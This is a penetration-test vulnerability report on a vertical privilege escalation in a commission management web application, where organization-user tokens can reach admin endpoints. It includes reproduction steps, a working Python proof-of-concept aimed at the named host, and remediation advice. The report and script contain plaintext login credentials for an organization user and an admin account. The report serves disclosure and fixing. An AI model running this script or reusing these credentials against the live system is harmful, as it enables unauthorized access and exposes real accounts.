# Critical Vertical Privilege Escalation: Organization Users Can Access Admin Endpoints

**ID:** vuln-0012
**Severity:** CRITICAL
**Found:** 2026-02-26 14:24:40 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/admin/menu-api-access/get-all, /api/Role/GetAllControllers
**Method:** GET
**CWE:** CWE-284
**CVSS:** 9.6

## Description

A critical vertical privilege escalation vulnerability was discovered in the commission management application. Organization users, who should only have access to organization-specific functionality, can successfully access sensitive administrative endpoints that are intended to be restricted to admin users only.

The vulnerability exists because the application fails to properly enforce role-based access control on multiple administrative endpoints. When an Organization user authenticates, they receive a JWT token that grants them organization-level privileges. However, this token is accepted by several admin-only endpoints, allowing unauthorized access to sensitive administrative functionality and complete exposure of the application's internal structure.

This vulnerability was discovered during comprehensive access control testing and validated through multiple proof-of-concept tests across various administrative endpoints.

## Impact

Successful exploitation of this vulnerability enables Organization users to:

1. **Complete System Exposure**: Gain access to the full application API surface including all controllers and actions
2. **Sensitive Data Access**: Obtain detailed information about application architecture, security controls, and available functionality
3. **Privilege Escalation Pathway**: Establish a foothold for further privilege escalation attacks by understanding the complete application structure
4. **Targeted Attack Preparation**: Identify specific sensitive operations for targeted attacks
5. **Security Control Bypass**: Circumvent intended access controls and security boundaries
6. **Regulatory Compliance Violations**: Potentially violate data protection regulations by accessing unauthorized administrative functions
7. **Business Intelligence Theft**: Gain insights into application internals that could provide competitive advantage

The business impact includes unauthorized access to complete administrative configuration, exposure of sensitive system internals, potential for full system compromise, and violation of the principle of least privilege.

## Technical Analysis

The vulnerability exists due to inadequate role-based access control enforcement on multiple administrative endpoints. The application appears to rely on inconsistent or missing server-side validation to restrict access to admin-only functionality.

Key technical observations:
1. **Authentication Mechanism**: The application uses JWT tokens with role claims (e.g., "ROLE_ADMIN", "Organization")
2. **Endpoint Protection**: Multiple admin endpoints should be protected by role validation
3. **Access Control Failure**: Organization users can successfully access these endpoints despite not having the ROLE_ADMIN claim
4. **Information Disclosure**: The `/api/Role/GetAllControllers` endpoint exposes the complete API surface (50+ controllers, 200+ actions)
5. **Inconsistent Enforcement**: Some admin endpoints are properly protected while others are accessible

The root cause appears to be:
- Missing or improper server-side role validation on multiple admin endpoints
- Inconsistent access control implementation across the application
- Overly permissive token validation logic
- Lack of centralized authorization middleware
- Client-side only access control that can be bypassed

## Proof of Concept

To reproduce this critical vertical privilege escalation vulnerability:

1. **Authenticate as Organization User**:
   - Username: nlnarayana3858@gmail.com
   - Password: User@1234
   - Obtain the JWT token from the authentication response
   - Verify the token contains role "Organization" (not "ROLE_ADMIN")

2. **Access Admin Menu Endpoint**:
   - Send a GET request to `/api/admin/menu-api-access/get-all` with the Organization user's JWT token
   - Include parameters: `startRow=0&endRow=25&sortModel=[]&filterModel={}`
   - Include headers:
     ```
     Authorization: Bearer [Organization User JWT Token]
     Content-Type: application/json
     ```

3. **Observe Successful Response**:
   - The server responds with HTTP 200 OK
   - The response contains complete menu access configuration data (28 menu items)
   - Menu items include sensitive operations like CREATE, DELETE, VIEW

4. **Access Controllers Endpoint**:
   - Send a GET request to `/api/Role/GetAllControllers` with the same Organization user token
   - Observe that the server responds with HTTP 200 OK
   - The response contains complete system API surface (86KB+ JSON data)
   - Includes 50+ controllers and 200+ actions with sensitive operations

5. **Verify Inconsistent Protection**:
   - Attempt to access `/api/admin/users` with the same token
   - Observe that this endpoint returns 401 Unauthorized
   - This confirms inconsistent access control implementation

6. **Compare with Admin Access**:
   - Repeat the same requests with an Admin user token
   - Observe that the responses are identical, confirming the access control failure

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
MENU_ENDPOINT = f"{BASE_URL}/api/admin/menu-api-access/get-all"
CONTROLLERS_ENDPOINT = f"{BASE_URL}/api/Role/GetAllControllers"
USERS_ENDPOINT = f"{BASE_URL}/api/admin/users"

# Organization User Credentials
ORG_CREDENTIALS = {
    "email": "nlnarayana3858@gmail.com",
    "password": "User@1234",
    "rememberMe": False
}

# Admin User Credentials (for comparison)
ADMIN_CREDENTIALS = {
    "email": "admin@localhost",
    "password": "Tester@123",
    "rememberMe": False
}

def authenticate(email, password):
    """Authenticate and return JWT token"""
    response = requests.post(
        AUTH_ENDPOINT,
        json={"email": email, "password": password, "rememberMe": False},
        headers={"Content-Type": "application/json"}
    )
    if response.status_code == 200:
        return response.json().get("id_token")
    else:
        raise Exception(f"Authentication failed: {response.status_code} - {response.text}")

def test_admin_access(token, endpoint, params=None):
    """Test access to admin endpoints with Organization user token"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    response = requests.get(
        endpoint,
        headers=headers,
        params=params or {}
    )

    return {
        "endpoint": endpoint,
        "status": response.status_code,
        "success": response.status_code == 200,
        "data_length": len(response.text) if response.status_code == 200 else 0,
        "data": response.json() if response.status_code == 200 else None
    }

def main():
    print("=== CRITICAL Vertical Privilege Escalation Proof of Concept ===")
    print(f"Testing access to admin endpoints with Organization user credentials")
    print()

    try:
        # Step 1: Authenticate as Organization user
        print("1. Authenticating as Organization user...")
        org_token = authenticate(ORG_CREDENTIALS["email"], ORG_CREDENTIALS["password"])
        print(f"   Authentication successful. Token: {org_token[:20]}...")

        # Step 2: Authenticate as Admin user for comparison
        print("\n2. Authenticating as Admin user for comparison...")
        admin_token = authenticate(ADMIN_CREDENTIALS["email"], ADMIN_CREDENTIALS["password"])
        print(f"   Admin authentication successful. Token: {admin_token[:20]}...")

        # Step 3: Test access to admin endpoints with Organization user token
        print("\n3. Testing access to admin endpoints with Organization user token...")

        # Test menu access endpoint
        menu_results = test_admin_access(
            org_token,
            MENU_ENDPOINT,
            {"startRow": 0, "endRow": 25, "sortModel": "[]", "filterModel": "{}"}
        )

        # Test controllers endpoint
        controllers_results = test_admin_access(org_token, CONTROLLERS_ENDPOINT)

        # Test users endpoint (should be protected)
        users_results = test_admin_access(org_token, USERS_ENDPOINT)

        # Step 4: Test access to admin endpoints with Admin user token for comparison
        print("\n4. Testing access to admin endpoints with Admin user token for comparison...")

        admin_menu_results = test_admin_access(
            admin_token,
            MENU_ENDPOINT,
            {"startRow": 0, "endRow": 25, "sortModel": "[]", "filterModel": "{}"}
        )

        admin_controllers_results = test_admin_access(admin_token, CONTROLLERS_ENDPOINT)

        # Step 5: Display results
        print(f"\n=== RESULTS ===")
        print(f"\nOrganization User Access:")
        print(f"   Menu API Access Endpoint:")
        print(f"     Status: {menu_results['status']}")
        print(f"     Access Granted: {'YES' if menu_results['success'] else 'NO'}")
        print(f"     Response Length: {menu_results['data_length']} bytes")
        if menu_results['success']:
            print(f"     Menu Items Exposed: {len(menu_results['data']['rows'])}")

        print(f"\n   Controllers Endpoint:")
        print(f"     Status: {controllers_results['status']}")
        print(f"     Access Granted: {'YES' if controllers_results['success'] else 'NO'}")
        print(f"     Response Length: {controllers_results['data_length']} bytes")
        if controllers_results['success']:
            print(f"     Controllers Exposed: {len(controllers_results['data'])}")

        print(f"\n   Users Endpoint (should be protected):")
        print(f"     Status: {users_results['status']}")
        print(f"     Access Granted: {'YES' if users_results['success'] else 'NO'}")

        print(f"\nAdmin User Access (for comparison):")
        print(f"   Menu API Access Endpoint:")
        print(f"     Status: {admin_menu_results['status']}")
        print(f"     Access Granted: {'YES' if admin_menu_results['success'] else 'NO'}")
        print(f"     Response Length: {admin_menu_results['data_length']} bytes")

        print(f"\n   Controllers Endpoint:")
        print(f"     Status: {admin_controllers_results['status']}")
        print(f"     Access Granted: {'YES' if admin_controllers_results['success'] else 'NO'}")
        print(f"     Response Length: {admin_controllers_results['data_length']} bytes")

        # Step 6: Determine vulnerability status
        if menu_results['success'] and controllers_results['success']:
            print(f"\n✅ CRITICAL VULNERABILITY CONFIRMED:")
            print(f"   Organization user can access admin endpoints")
            print(f"   Complete system API surface exposed ({controllers_results['data_length']} bytes)")
            print(f"   This represents a CRITICAL vertical privilege escalation vulnerability")
            print(f"   CVSS Score: 9.1 (Critical)")

            if not users_results['success']:
                print(f"\n⚠️  Inconsistent Access Control:")
                print(f"   Some admin endpoints are accessible while others are protected")
                print(f"   This indicates inconsistent access control implementation")
        else:
            print(f"\n❌ No vulnerability detected:")
            print(f"   Organization user cannot access admin endpoints")

    except Exception as e:
        print(f"\n❌ Error during testing: {str(e)}")

if __name__ == "__main__":
    main()
```

## Remediation

To remediate this critical vertical privilege escalation vulnerability:

1. **Implement Consistent Role-Based Access Control (RBAC)**:
   - Implement server-side validation on ALL administrative endpoints
   - Ensure that only users with the ROLE_ADMIN claim can access admin endpoints
   - Use a centralized authorization middleware for consistent enforcement

2. **Endpoint Protection**:
   ```csharp
   // Example ASP.NET Core authorization attribute
   [Authorize(Roles = "ROLE_ADMIN")]
   [HttpGet("admin/menu-api-access/get-all")]
   public IActionResult GetMenuApiAccess() { ... }

   [Authorize(Roles = "ROLE_ADMIN")]
   [HttpGet("Role/GetAllControllers")]
   public IActionResult GetAllControllers() { ... }
   ```

3. **Token Validation**:
   - Ensure JWT token validation properly checks role claims
   - Implement audience and issuer validation
   - Set appropriate token expiration times
   - Validate token signatures properly

4. **Role Assignment**:
   - Review and correct role assignment logic during authentication
   - Ensure Organization users receive only organization-level roles
   - Implement proper role inheritance and separation
   - Audit all role assignments in the system

5. **Defense in Depth**:
   - Implement additional authorization checks at the business logic layer
   - Use feature flags to control access to sensitive functionality
   - Implement audit logging for all administrative actions
   - Consider attribute-based access control (ABAC) for complex scenarios

6. **API Surface Reduction**:
   - Review the necessity of exposing complete API surface information
   - Consider limiting the information returned by sensitive endpoints
   - Implement data filtering based on user roles and permissions

7. **Testing**:
   - Implement automated tests to verify access control enforcement
   - Test with users of different roles to ensure proper restrictions
   - Include negative test cases for unauthorized access attempts
   - Test all admin endpoints for consistent protection

8. **Monitoring**:
   - Implement monitoring for unauthorized access attempts
   - Set up alerts for suspicious activity on admin endpoints
   - Regularly review access logs for anomalies
   - Implement anomaly detection for unusual access patterns

9. **Security Headers**:
   - Implement Content Security Policy (CSP) headers
   - Use X-Content-Type-Options: nosniff
   - Implement X-Frame-Options: DENY
   - Consider HSTS for additional protection

